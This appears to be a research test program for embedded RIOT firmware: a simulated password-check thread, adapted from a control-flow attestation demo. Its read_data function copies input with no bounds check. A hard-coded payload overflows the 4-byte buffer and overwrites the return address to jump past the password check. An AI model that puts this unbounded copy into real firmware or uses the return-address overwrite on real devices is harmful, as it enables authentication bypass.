/**
 * Muhammad Wasif Kamran
 *
 * Violation Example #1: Buffer overflow on return address violation
 *      Based on: https://github.com/RIT-CHAOS-SEC/ACFA/blob/main/demo_prv/main.c
 * 
 * Expected behaviour:
 *      P3OUT : 0x50
 *      P1OUT : 0x01
 *
 * Approx. sim time: 15ms
 */

#include <inttypes.h>
#include <stdio.h>

#include "hardware.h"
#include "irq.h"
#include "msg.h"
#include "thread.h"

// Watchdog timer
#define WDTCTL_ 0x0120 /* Watchdog Timer Control */
#define WDTHOLD (0x0080)
#define WDTPW (0x5A00)

kernel_pid_t second_pid, pwd_pid;

char second_thread_stack[THREAD_STACKSIZE_MEDIUM];
char third_thread_stack[THREAD_STACKSIZE_MEDIUM];
char pwd_stack[THREAD_STACKSIZE_MEDIUM];

void *second_thread(void *arg);
void *third_thread(void *arg);
void *pwd_thread(void *arg);

// TARGET ADDRESS OF ATTACK: location of "access granted" -- 0xd1da
#define TARGET_UPPER 0xd1
#define TARGET_LOWER 0xda

// Password defines
#define size 4
#define user_size 5
#define attack_size 9
#define cr '\r'

// Password
char pass[4] = {'a', 'b', 'c', 'd'};

// Simulate non-attack input
//char user_input[5] = {'a', 'b', 'c', 'd', '\r'};

// Simulate Buffer overflow attack
// Since the code waits for '\r', the return address can be overwritten to skip the password check
// This input includes an incorrect password jump to 'grant access' after the return from
// waitForPassword
char user_input[attack_size] = {0x01, 0x02,         0x03,         0x04, 0x00,
                                0x04, TARGET_LOWER, TARGET_UPPER, '\r'};

void read_data(char *entry)
{
        // simulate uart receive
        int i = 0;
        while (user_input[i] != cr) {
                // save read value
                entry[i] = user_input[i];
                i++;
        }
}

char waitForPassword()
{
        char entry[4] = {0, 0, 0, 0};

        read_data(entry);

        char total = 0;
        unsigned int i;
        for (i = 0; i < 4; i++) {
                total |= (pass[i] ^ entry[i]);
        }

        return total;
}

/**
 * This thread will sleep unless woken up by the other thread to retrieve and send the password
 */
void *pwd_thread(void *arg)
{
        (void)arg;

        while (1) {
                char total = waitForPassword();

                msg_t m;
                m.content.value = total;

                msg_try_send(&m, second_pid);

                thread_sleep();
        }

        return NULL;
}

/**
 * second_thread simply wakes up the password thread and requests the password, then changes P1OUT
 * based on the password given
 */
void *second_thread(void *arg)
{
        (void)arg;

        second_pid = thread_getpid();

        msg_t m;

        while (1) {
                thread_wakeup(pwd_pid);

                msg_receive(&m);

                if (m.content.value != 0) {
                        // Deny access
                        P1OUT = 0x00;
                } else {
                        // Grant access
                        P1OUT = 0x01;
                }
        }

        return NULL;
}

int main(void)
{
        WDTCTL = WDTPW | WDTHOLD; /* Disable watchdog */

        P3OUT = 0x50;

        second_pid = thread_create(second_thread_stack, sizeof(second_thread_stack),
                                   THREAD_PRIORITY_MAIN - 4, THREAD_CREATE_WOUT_YIELD,
                                   second_thread, NULL, "pong");

        pwd_pid = thread_create(pwd_stack, sizeof(pwd_stack), THREAD_PRIORITY_MAIN - 3,
                                THREAD_CREATE_SLEEPING, pwd_thread, NULL, "pwd");

        /* due to THREAD_CREATE_WOUT_YIELD, execution does not start in any of the threads until the
         * following call to thread_yield() which gives execution to the highest priority thread
         * that is also awake (second_thread) */

        thread_yield();
}
